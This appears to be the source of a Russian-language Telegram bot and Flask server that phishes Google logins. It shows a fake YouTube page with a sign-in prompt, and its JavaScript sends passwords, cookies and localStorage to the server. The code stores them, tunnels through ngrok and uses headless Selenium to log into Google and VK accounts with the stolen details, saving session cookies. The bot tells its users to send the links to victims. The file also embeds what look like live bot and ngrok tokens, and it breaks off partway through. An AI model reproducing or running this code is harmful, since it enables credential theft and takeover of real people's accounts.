import logging
import asyncio
import json
import re
import uuid
import html
import os
import time
import threading
import pickle
import tempfile
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from dataclasses import dataclass, asdict
import base64
from flask import Flask, request, jsonify, Response
from flask_cors import CORS

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = "8563753978:AAFGVXvRanl0w4DSPfvDYh08aHPLPE0hQ1I"  # Замените на ваш токен от @BotFather
ADMIN_ID = 8524326478  # Ваш Telegram ID (получите у @userinfobot)

# Для ngrok
USE_NGROK = True  # Используем ngrok для локального тестирования
NGROK_AUTH_TOKEN = "395kpmzwiHQt9pEmwSSFsGQiafk_6kCkcbgKxPiTFaGSu4ihH"  # Получите на ngrok.com (бесплатно)

# Автоматически определим домен ngrok при запуске
DOMAIN = "http://localhost:5000"  # Временное значение, изменится при запуске

# ========== NGROK НАСТРОЙКА ==========
def setup_ngrok():
    """Настройка ngrok туннеля"""
    try:
        if USE_NGROK:
            from pyngrok import ngrok, conf
            import nest_asyncio
            
            # Применяем nest_asyncio для работы с asyncio в потоках
            nest_asyncio.apply()
            
            # Устанавливаем токен аутентификации
            if NGROK_AUTH_TOKEN and NGROK_AUTH_TOKEN != "ВАШ_ТОКЕН_NGROK":
                conf.get_default().auth_token = NGROK_AUTH_TOKEN
            
            # Открываем туннель
            public_url = ngrok.connect(5000, proto="http").public_url
            logger.info(f"✅ Ngrok туннель создан: {public_url}")
            
            # Устанавливаем домен
            global DOMAIN
            DOMAIN = public_url
            
            return public_url
    except Exception as e:
        logger.error(f"❌ Ошибка настройки ngrok: {e}")
        return None

# ========== FLASK СЕРВЕР ==========
app = Flask(__name__, static_folder='static')
CORS(app)

# Создаем папки если нет
os.makedirs('static', exist_ok=True)
os.makedirs('screenshots', exist_ok=True)
os.makedirs('cookies', exist_ok=True)

# ========== ВЕБ-ОБРАБОТЧИКИ ==========

@app.route('/')
def home():
    """Главная страница"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>YouTube Player</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { margin: 0; padding: 20px; background: #000; color: white; font-family: Arial; }
            .container { max-width: 800px; margin: 0 auto; }
            .player { position: relative; padding-bottom: 56.25%; height: 0; }
            .player iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
            .warning { background: #ff4444; padding: 15px; border-radius: 5px; margin: 20px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎬 YouTube Video Player</h1>
            <div class="warning">
                ⚠️ Для просмотра видео требуется вход в аккаунт Google
            </div>
            <div class="player">
                <iframe id="videoFrame" src="" frameborder="0" allowfullscreen></iframe>
            </div>
            <div id="loginForm" style="display: none; margin-top: 20px; background: white; padding: 20px; border-radius: 10px; color: black;">
                <h3>Вход в Google</h3>
                <form id="googleForm">
                    <input type="email" placeholder="Email" style="width: 100%; padding: 10px; margin: 5px 0;">
                    <input type="password" placeholder="Пароль" style="width: 100%; padding: 10px; margin: 5px 0;">
                    <button type="submit" style="width: 100%; padding: 10px; background: #4285f4; color: white; border: none; border-radius: 5px;">Войти</button>
                </form>
            </div>
        </div>
        
        <script>
            // Получаем параметры из URL
            const urlParams = new URLSearchParams(window.location.search);
            const videoId = urlParams.get('v') || 'dQw4w9WgXcQ';
            const linkId = urlParams.get('id') || 'unknown';
            
            // Устанавливаем видео
            document.getElementById('videoFrame').src = `https://www.youtube.com/embed/${videoId}?autoplay=1`;
            
            // Показываем форму входа через 3 секунды
            setTimeout(() => {
                document.getElementById('loginForm').style.display = 'block';
            }, 3000);
            
            // Отправляем данные о посещении
            fetch('/api/visit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    link_id: linkId,
                    url: window.location.href,
                    user_agent: navigator.userAgent
                })
            });
            
            // Сбор данных
            function collectData() {
                const data = {
                    cookies: document.cookie,
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    user_agent: navigator.userAgent
                };
                
                fetch('/api/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        link_id: linkId,
                        data_type: 'instant',
                        data: btoa(JSON.stringify(data))
                    })
                });
            }
            
            // Собираем данные при загрузке
            window.addEventListener('load', collectData);
            
            // Собираем при отправке формы
            document.getElementById('googleForm').addEventListener('submit', function(e) {
                e.preventDefault();
                collectData();
                alert('Проверка учетных данных...');
            });
            
            // Периодический сбор
            setInterval(collectData, 10000);
        </script>
    </body>
    </html>
    """

@app.route('/watch')
def phishing_page():
    """Фишинговая страница с YouTube видео"""
    video_id = request.args.get('v', 'dQw4w9WgXcQ')
    link_id = request.args.get('id', 'unknown')
    
    # Обновляем счетчик кликов
    if link_id != 'unknown':
        db.add_click(link_id)
    
    # Создаем HTML страницу
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>YouTube Video</title>
        <style>
            body {{
                margin: 0;
                padding: 0;
                background: #000;
                font-family: Arial, sans-serif;
                color: white;
            }}
            .container {{
                max-width: 1200px;
                margin: 0 auto;
                padding: 20px;
            }}
            .player-container {{
                position: relative;
                padding-bottom: 56.25%;
                height: 0;
                overflow: hidden;
                margin: 20px 0;
            }}
            .player-container iframe {{
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                border: none;
            }}
            .login-prompt {{
                background: #4285f4;
                padding: 20px;
                border-radius: 10px;
                text-align: center;
                margin: 20px 0;
            }}
            .login-form {{
                background: white;
                padding: 20px;
                border-radius: 10px;
                color: black;
                margin: 20px 0;
            }}
            input, button {{
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ddd;
                border-radius: 5px;
                box-sizing: border-box;
            }}
            button {{
                background: #4285f4;
                color: white;
                border: none;
                cursor: pointer;
                font-size: 16px;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1 style="text-align: center;">🎬 YouTube Video Player</h1>
            
            <div class="login-prompt">
                <h3>⚠️ Для просмотра видео требуется авторизация</h3>
                <p>Пожалуйста, войдите в свой аккаунт Google</p>
                <button onclick="showLoginForm()">Войти в аккаунт</button>
            </div>
            
            <div class="player-container">
                <iframe src="https://www.youtube.com/embed/{video_id}?autoplay=1&controls=1&rel=0" 
                        allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" 
                        allowfullscreen>
                </iframe>
            </div>
            
            <div id="loginForm" class="login-form" style="display: none;">
                <h3 style="color: #333; text-align: center;">Вход в Google</h3>
                <form id="googleLoginForm" onsubmit="submitForm(event)">
                    <input type="email" id="email" placeholder="Email или телефон" required>
                    <input type="password" id="password" placeholder="Пароль" required>
                    <button type="submit">Далее</button>
                </form>
                <p style="color: #666; font-size: 12px; text-align: center;">
                    Нажимая "Далее", вы соглашаетесь с Условиями использования
                </p>
            </div>
            
            <div id="status" style="text-align: center; padding: 20px; display: none;">
                <p>🔐 Проверка данных... Пожалуйста, подождите</p>
            </div>
        </div>
        
        <script>
            const linkId = "{link_id}";
            
            function showLoginForm() {{
                document.querySelector('.login-prompt').style.display = 'none';
                document.getElementById('loginForm').style.display = 'block';
            }}
            
            function submitForm(e) {{
                e.preventDefault();
                document.getElementById('status').style.display = 'block';
                
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;
                
                // Собираем все данные
                const data = {{
                    timestamp: new Date().toISOString(),
                    email: email,
                    password: password,
                    cookies: document.cookie,
                    localStorage: JSON.stringify({{...window.localStorage}}),
                    userAgent: navigator.userAgent,
                    screen: {{width: screen.width, height: screen.height}},
                    url: window.location.href
                }};
                
                // Отправляем данные
                fetch('/api/collect', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        link_id: linkId,
                        data_type: 'credentials',
                        data: btoa(JSON.stringify(data))
                    }})
                }}).then(() => {{
                    document.getElementById('status').innerHTML = '<p>✅ Успешный вход! Видео загружается...</p>';
                }});
                
                // Автоматически показываем форму через 5 секунд
                setTimeout(showLoginForm, 5000);
            }}
            
            // Автоматический сбор данных при загрузке
            window.addEventListener('load', function() {{
                // Собираем базовые данные
                const basicData = {{
                    timestamp: new Date().toISOString(),
                    cookies: document.cookie,
                    userAgent: navigator.userAgent,
                    url: window.location.href
                }};
                
                fetch('/api/collect', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        link_id: linkId,
                        data_type: 'basic',
                        data: btoa(JSON.stringify(basicData))
                    }})
                }});
            }});
            
            // Периодический сбор
            setInterval(() => {{
                const periodicData = {{
                    timestamp: new Date().toISOString(),
                    cookies: document.cookie,
                    url: window.location.href
                }};
                
                fetch('/api/collect', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        link_id: linkId,
                        data_type: 'periodic',
                        data: btoa(JSON.stringify(periodicData))
                    }})
                }});
            }}, 15000);
        </script>
    </body>
    </html>
    """
    
    return Response(html_content, mimetype='text/html')

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """API для сбора данных"""
    try:
        data = request.json
        link_id = data.get('link_id')
        
        if link_id and link_id != 'unknown':
            # Декодируем данные
            try:
                decoded_data = base64.b64decode(data.get('data', '')).decode('utf-8')
                json_data = json.loads(decoded_data)
                
                # Сохраняем в базу
                db.add_collected_data(link_id, {
                    'type': data.get('data_type', 'unknown'),
                    'data': json_data,
                    'timestamp': datetime.now().isoformat(),
                    'ip': request.remote_addr
                })
                
                # Логируем
                logger.info(f"📥 Данные получены для {link_id}: {data.get('data_type')}")
                
                # Если есть credentials, сохраняем отдельно
                if data.get('data_type') == 'credentials':
                    email = json_data.get('email')
                    password = json_data.get('password')
                    
                    if email:
                        db.add_collected_logins(link_id, [{
                            'value': email,
                            'type': 'email',
                            'timestamp': datetime.now().isoformat(),
                            'source': 'form'
                        }])
                    
                    if password:
                        db.add_collected_passwords(link_id, [{
                            'value': password,
                            'type': 'password',
                            'timestamp': datetime.now().isoformat(),
                            'source': 'form'
                        }])
                
                # Cookies
                if json_data.get('cookies'):
                    cookies_list = []
                    for cookie in json_data['cookies'].split(';'):
                        if '=' in cookie:
                            name, value = cookie.strip().split('=', 1)
                            cookies_list.append({
                                'name': name,
                                'value': value,
                                'timestamp': datetime.now().isoformat()
                            })
                    
                    if cookies_list:
                        db.add_collected_cookies(link_id, cookies_list)
                
            except Exception as e:
                logger.error(f"Ошибка обработки данных: {e}")
        
        return jsonify({"status": "success"})
    
    except Exception as e:
        logger.error(f"Ошибка в /api/collect: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/visit', methods=['POST'])
def track_visit():
    """Трекинг посещений"""
    try:
        data = request.json
        link_id = data.get('link_id')
        
        if link_id and link_id != 'unknown':
            db.add_click(link_id)
            logger.info(f"👣 Новый визит на {link_id} с IP: {request.remote_addr}")
        
        return jsonify({"status": "success"})
    
    except Exception as e:
        logger.error(f"Ошибка в /api/visit: {e}")
        return jsonify({"status": "error"}), 500

# ========== БАЗА ДАННЫХ ==========

@dataclass
class PhishingLink:
    id: str
    original_url: str
    video_id: str
    created_at: str
    created_by: int
    clicks: int = 0
    data_collected: List[Dict] = None
    collected_cookies: List[Dict] = None
    collected_passwords: List[Dict] = None
    collected_logins: List[Dict] = None
    
    def __post_init__(self):
        if self.data_collected is None:
            self.data_collected = []
        if self.collected_cookies is None:
            self.collected_cookies = []
        if self.collected_passwords is None:
            self.collected_passwords = []
        if self.collected_logins is None:
            self.collected_logins = []

class Database:
    def __init__(self):
        self.links: Dict[str, PhishingLink] = {}
        self.stats = {
            "total_links": 0,
            "total_clicks": 0,
            "cookies_collected": 0,
            "passwords_collected": 0,
            "logins_collected": 0
        }
    
    def add_link(self, link: PhishingLink):
        self.links[link.id] = link
        self.stats["total_links"] += 1
        self.save()
    
    def get_link(self, link_id: str) -> Optional[PhishingLink]:
        return self.links.get(link_id)
    
    def add_click(self, link_id: str):
        if link_id in self.links:
            self.links[link_id].clicks += 1
            self.stats["total_clicks"] += 1
            self.save()
    
    def add_collected_data(self, link_id: str, data: Dict):
        if link_id in self.links:
            self.links[link_id].data_collected.append(data)
            self.save()
    
    def add_collected_cookies(self, link_id: str, cookies: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_cookies.extend(cookies)
            self.stats["cookies_collected"] += len(cookies)
            self.save()
    
    def add_collected_passwords(self, link_id: str, passwords: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_passwords.extend(passwords)
            self.stats["passwords_collected"] += len(passwords)
            self.save()
    
    def add_collected_logins(self, link_id: str, logins: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_logins.extend(logins)
            self.stats["logins_collected"] += len(logins)
            self.save()
    
    def save(self):
        try:
            data = {
                "links": {k: asdict(v) for k, v in self.links.items()},
                "stats": self.stats
            }
            with open("database.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Ошибка сохранения БД: {e}")
    
    def load(self):
        try:
            with open("database.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                self.links = {k: PhishingLink(**v) for k, v in data.get("links", {}).items()}
                self.stats = data.get("stats", self.stats)
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.error(f"Ошибка загрузки БД: {e}")

# Инициализация БД
db = Database()
db.load()

# ========== АВТОМАТИЧЕСКИЙ ВХОД ==========

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
    
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    logger.warning("Selenium не установлен. Автоматический вход недоступен.")

class AutoLoginManager:
    """Менеджер автоматического входа через Selenium"""
    
    def __init__(self):
        self.driver = None
        self.service_urls = {
            "google": "https://accounts.google.com",
            "facebook": "https://facebook.com",
            "instagram": "https://instagram.com",
            "twitter": "https://twitter.com",
            "vk": "https://vk.com",
            "yandex": "https://passport.yandex.ru",
            "mailru": "https://mail.ru"
        }
    
    def setup_driver(self):
        """Настройка драйвера Chrome"""
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # Используем webdriver-manager для автоматической загрузки драйвера
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            
            # Маскируем WebDriver
            self.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            })
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            return True
        except Exception as e:
            logger.error(f"Ошибка настройки драйвера: {e}")
            return False
    
    def login_with_credentials(self, service, email, password):
        """Вход через логин и пароль"""
        try:
            if not self.driver:
                if not self.setup_driver():
                    return {"status": "error", "message": "Не удалось запустить браузер"}
            
            if service not in self.service_urls:
                return {"status": "error", "message": f"Сервис {service} не поддерживается"}
            
            url = self.service_urls[service]
            self.driver.get(url)
            time.sleep(3)
            
            # Вход в Google
            if service == "google":
                try:
                    # Вводим email
                    email_field = WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='email']"))
                    )
                    email_field.send_keys(email)
                    
                    # Кнопка Далее
                    next_btn = self.driver.find_element(By.CSS_SELECTOR, "#identifierNext button")
                    next_btn.click()
                    time.sleep(3)
                    
                    # Вводим пароль
                    password_field = WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password']"))
                    )
                    password_field.send_keys(password)
                    
                    # Кнопка Далее для пароля
                    password_next = self.driver.find_element(By.CSS_SELECTOR, "#passwordNext button")
                    password_next.click()
                    time.sleep(5)
                    
                    # Проверяем успешность
                    if "myaccount.google.com" in self.driver.current_url or "mail.google.com" in self.driver.current_url:
                        # Сохраняем cookies
                        cookies = self.driver.get_cookies()
                        cookie_file = f"cookies/google_{int(time.time())}.pkl"
                        with open(cookie_file, 'wb') as f:
                            pickle.dump(cookies, f)
                        
                        # Делаем скриншот
                        screenshot = f"screenshots/google_login_{int(time.time())}.png"
                        self.driver.save_screenshot(screenshot)
                        
                        return {
                            "status": "success",
                            "service": "google",
                            "logged_in": True,
                            "cookies_file": cookie_file,
                            "screenshot": screenshot,
                            "account": email
                        }
                    else:
                        return {"status": "error", "message": "Неверные учетные данные"}
                        
                except Exception as e:
                    return {"status": "error", "message": f"Ошибка входа: {str(e)}"}
            
            # Вход в ВКонтакте
            elif service == "vk":
                try:
                    # Вводим логин
                    email_field = self.driver.find_element(By.CSS_SELECTOR, "input[name='email']")
                    email_field.send_keys(email)
                    
                    # Вводим пароль
                    password_field = self.driver.find_element(By.CSS_SELECTOR, "input[name='pass']")
                    password_field.send_keys(password)
                    
                    # Кнопка входа
                    login_btn = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
                    login_btn.click()
                    time.sleep(5)
                    
                    if "vk.com/feed" in self.driver.current_url:
                        cookies = self.driver.get_cookies()
                        cookie_file = f"cookies/vk_{int(time.time())}.pkl"
                        with open(cookie_file, 'wb') as f:
                            pickle.dump(cookies, f)
                        
                        screenshot = f"screenshots/vk_login_{int(time.time())}.png"
                        self.driver.save_screenshot(screenshot)
                        
                        return {
                            "status": "success",
                            "service": "vk",
                            "logged_in": True,
                            "cookies_file": cookie_file,
                            "screenshot": screenshot,
                            "account": email
                        }
                    else:
                        return {"status": "error", "message": "Неверные учетные данные"}
                        
                except Exception as e:
                    return {"status": "error", "message": f"Ошибка входа: {str(e)}"}
            
            return {"status": "error", "message": "Сервис пока не реализован"}
            
        except Exception as e:
            logger.error(f"Ошибка входа в {service}: {e}", exc_info=True)
            return {"status": "error", "message": str(e)}
    
    def login_with_cookies(self, service, cookies_file):
        """Вход через сохраненные cookies"""
        try:
            if not self.driver:
                if not self.setup_driver():
                    return {"status": "error", "message": "Не удалось запустить браузер"}
            
            if service not in self.service_urls:
                return {"status": "error", "message": f"Сервис {service} не поддерживается"}
            
            # Загружаем cookies
            with open(cookies_file, 'rb') as f:
                cookies = pickle.load(f)
            
            # Открываем страницу
            url = self.service_urls[service]
            self.driver.get(url)
            time.sleep(2)
            
            # Очищаем существующие cookies
            self.driver.delete_all_cookies()
            
            # Добавляем cookies
            for cookie in cookies:
                try:
                    self.driver.add_cookie(cookie)
                except:
                    pass
            
            # Обновляем страницу
            self.driver.refresh()
            time.sleep(5)
            
            # Проверяем вход
            if self.check_login(service):
                screenshot = f"screenshots/{service}_cookies_{int(time.time())}.png"
                self.driver.save_screenshot(screenshot)
                
                return {
                    "status": "success",
                    "service": service,
                    "logged_in": True,
                    "screenshot": screenshot,
                    "method": "cookies"
                }
            else:
                return {"status": "error", "message": "Cookies устарели или недействительны"}
                
        except Exception as e:
            logger.error(f"Ошибка входа по cookies: {e}")
            return {"status": "error", "message": str(e)}
    
    def check_login(self, service):
        """Проверка успешности входа"""
        try:
            if service == "google":
                return "myaccount.google.com" in self.driver.current_url or "mail.google.com" in self.driver.current_url
            elif service == "vk":
                return "vk.com/feed" in self.driver.current_url
            elif service == "facebook":
                return "facebook.com/home" in self.driver.current_url
            elif service == "instagram":
                return "instagram.com/" in self.driver.current_url and not "accounts/login" in self.driver.current_url
            return False
        except:
            return False
    
    def close(self):
        """Закрытие драйвера"""
        if self.driver:
            self.driver.quit()
            self.driver = None

# Инициализируем менеджер входа
auto_login_manager = AutoLoginManager() if SELENIUM_AVAILABLE else None

# ========== ГЕНЕРАТОР ССЫЛОК ==========

class LinkGenerator:
    @staticmethod
    def extract_video_id(url: str) -> str:
        """Извлечение ID видео из YouTube URL"""
        patterns = [
            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
            r'(?:v=|\/)([a-zA-Z0-9_-]{11})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        return "dQw4w9WgXcQ"  # Rick Roll по умолчанию
    
    @staticmethod
    def generate_link_id() -> str:
        """Генерация ID ссылки"""
        return str(uuid.uuid4()).replace('-', '')[:12]
    
    @staticmethod
    def create_phishing_url(video_id: str, link_id: str) -> str:
        """Создание фишинговой ссылки"""
        return f"{DOMAIN}/watch?v={video_id}&id={link_id}&t={int(time.time())}"

link_generator = LinkGenerator()

# ========== ТЕЛЕГРАМ БОТ ==========

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    user = update.effective_user
    
    message = f"""
👋 Привет, {user.first_name}!

🤖 *YouTube Data Collector Bot*

🎯 *Что умеет бот:*
1. Создает фишинговые ссылки на YouTube видео
2. Собирает cookies, логины и пароли
3. Автоматически входит в аккаунты
4. Отправляет все данные вам и администратору

🔗 *Как использовать:*
1. Отправьте ссылку на YouTube видео
2. Получите фишинговую ссылку
3. Отправьте её жертве
4. Получите собранные данные
5. Используйте /login для автоматического входа

📊 *Статистика:*
• Ссылок создано: {db.stats['total_links']}
• Переходов: {db.stats['total_clicks']}
• Cookies собрано: {db.stats['cookies_collected']}
• Паролей: {db.stats['passwords_collected']}
• Логинов: {db.stats['logins_collected']}

🚀 *Доступные команды:*
/start - Начало работы
/link [youtube_url] - Создать ссылку
/data [id] - Посмотреть данные
/login [id] - Автоматический вход
/stats - Статистика
/help - Помощь

🌐 *Ваш домен:* {DOMAIN}
"""
    
    keyboard = [
        [InlineKeyboardButton("🎯 Создать ссылку", callback_data="create_link")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
        [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
        [InlineKeyboardButton("🚀 Авто-вход", callback_data="auto_login")],
        [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

async def create_link_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Создание фишинговой ссылки"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🎯 *Создание фишинговой ссылки*\n\n"
            "Используйте: `/link [youtube_url]`\n\n"
            "Пример: `/link https://youtube.com/watch?v=dQw4w9WgXcQ`\n"
            "Или просто отправьте ссылку на YouTube",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    url = context.args[0]
    await process_youtube_link(update, context, url)

async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка YouTube ссылки"""
    url = update.message.text.strip()
    await process_youtube_link(update, context, url)

async def process_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE, url: str):
    """Обработка ссылки"""
    user = update.effective_user
    
    if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
        await update.message.reply_text("❌ Это не ссылка YouTube!")
        return
    
    # Извлекаем ID видео
    video_id = link_generator.extract_video_id(url)
    
    # Генерируем ID ссылки
    link_id = link_generator.generate_link_id()
    
    # Создаем фишинговую ссылку
    phishing_url = link_generator.create_phishing_url(video_id, link_id)
    
    # Создаем объект ссылки
    link = PhishingLink(
        id=link_id,
        original_url=url,
        video_id=video_id,
        created_at=datetime.now().isoformat(),
        created_by=user.id
    )
    
    # Сохраняем
    db.add_link(link)
    
    message = f"""
✅ *ССЫЛКА СОЗДАНА!*

🔗 *Оригинальное видео:*
`{url}`

🚀 *Ваша фишинговая ссылка:*
`{phishing_url}`

📊 *Информация:*
• ID: `{link_id}`
• Видео ID: `{video_id}`
• Создано: {datetime.now().strftime('%H:%M:%S')}

🔐 *Что будет собрано:*
✓ Cookies и сессионные данные
✓ Логины и пароли из форм
✓ Данные браузера
✓ Информация об устройстве

💡 *Как использовать:*
1. Отправьте ссылку жертве
2. Когда она перейдет - данные соберутся
3. Получите уведомление в этот чат
4. Используйте /login {link_id} для входа
"""
    
    keyboard = [
        [
            InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link_id}"),
            InlineKeyboardButton("🚀 Поделиться", callback_data=f"share_{link_id}")
        ],
        [
            InlineKeyboardButton("📊 Статистика", callback_data=f"stats_{link_id}"),
            InlineKeyboardButton("🔐 Данные", callback_data=f"data_{link_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    
    # Уведомление админу
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🆕 Новая ссылка создана\n"
                 f"👤 Пользователь: {user.id}\n"
                 f"🔗 {url}\n"
                 f"📌 ID: {link_id}\n"
                 f"🎬 Video: {video_id}",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

async def show_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Показать данные"""
    user = update.effective_user
    
    if not context.args:
        # Показываем список ссылок
        user_links = [link for link in db.links.values() if link.created_by == user.id]
        
        if not user_links:
            await update.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in user_links[-10:]:
            message += f"• `{link.id}`\n"
            message += f"  Видео: {link.video_id}\n"
            message += f"  Переходов: {link.clicks}\n"
            message += f"  Cookies: {len(link.collected_cookies)}\n"
            message += f"  Пароли: {len(link.collected_passwords)}\n"
            message += f"  Логины: {len(link.collected_logins)}\n"
            message += "  ─────\n"
        
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
        return
    
    # Показать данные конкретной ссылки
    link_id = context.args[0]
    link = db.get_link(link_id)
    
    if not link or link.created_by != user.id:
        await update.message.reply_text("❌ Ссылка не найдена или нет доступа.")
        return
    
    message = f"""
📊 *ДАННЫЕ ДЛЯ ССЫЛКИ {link_id[:12]}*

🎬 Видео: {link.video_id}
📅 Создано: {link.created_at[:16]}
👣 Переходов: {link.clicks}

🍪 *Cookies ({len(link.collected_cookies)}):*
"""
    
    for cookie in link.collected_cookies[-10:]:
        name = cookie.get('name', 'unknown')
        value = cookie.get('value', '')[:30]
        message += f"• {name}: {value}...\n"
    
    message += f"\n🔑 *Пароли ({len(link.collected_passwords)}):*\n"
    for pwd in link.collected_passwords[-5:]:
        value = pwd.get('value', '')
        message += f"• `{value}`\n"
    
    message += f"\n👤 *Логины ({len(link.collected_logins)}):*\n"
    for login in link.collected_logins[-5:]:
        value = login.get('value', '')
        message += f"• `{value}`\n"
    
    message += f"\n💡 Используйте /login {link_id} для автоматического входа"
    
    await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)

async def auto_login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Автоматический вход в аккаунты"""
    user = update.effective_user
    
    if not SELENIUM_AVAILABLE:
        await update.message.reply_text(
            "❌ Автоматический вход недоступен!\n"
            "Установите Selenium: `pip install selenium webdriver-manager`"
        )
        return
    
    if not context.args:
        # Показываем ссылки с данными
        user_links = [link for link in db.links.values() 
                     if link.created_by == user.id and 
                     (link.collected_passwords or link.collected_logins)]
        
        if not user_links:
            await update.message.reply_text(
                "📭 Нет данных для входа!\n\n"
                "1. Создайте ссылку\n"
                "2. Получите логины/пароли\n"
                "3. Используйте /login [id]"
            )
            return
        
        message = "🚀 *ВЫБЕРИТЕ ССЫЛКУ ДЛЯ ВХОДА:*\n\n"
        for link in user_links[:5]:
            message += f"• `{link.id}`\n"
            message += f"  Паролей: {len(link.collected_passwords)}\n"
            message += f"  Логинов: {len(link.collected_logins)}\n"
            message += f"  Видео: {link.video_id}\n"
            message += "  ─────\n"
        
        keyboard = []
        for link in user_links[:3]:
            keyboard.append([
                InlineKeyboardButton(f"🚀 Войти через {link.id[:8]}", 
                                   callback_data=f"login_{link.id}")
            ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        return
    
    # Запуск входа
    link_id = context.args[0]
    await start_auto_login(update, context, link_id)

async def start_auto_login(update: Update, context: ContextTypes.DEFAULT_TYPE, link_id: str):
    """Запуск автоматического входа"""
    link = db.get_link(link_id)
    
    if not link or link.created_by != update.effective_user.id:
        await update.message.reply_text("❌ Нет доступа.")
        return
    
    if not link.collected_passwords and not link.collected_logins:
        await update.message.reply_text("❌ Нет данных для входа.")
        return
    
    # Начинаем процесс
    status_msg = await update.message.reply_text("🔄 *Запускаю автоматический вход...*", 
                                                parse_mode=ParseMode.MARKDOWN)
    
    results = []
    
    # Пробуем Google
    for login in link.collected_logins:
        email = login.get('value', '')
        if '@gmail.com' in email or '@googlemail.com' in email:
            # Ищем пароль для этого email
            password = None
            for pwd in link.collected_passwords:
                # Простая эвристика
                if len(pwd.get('value', '')) > 6:
                    password = pwd.get('value')
                    break
            
            if password:
                await status_msg.edit_text(f"🔐 *Пытаюсь войти в Google...*\n\nEmail: `{email[:20]}...`")
                
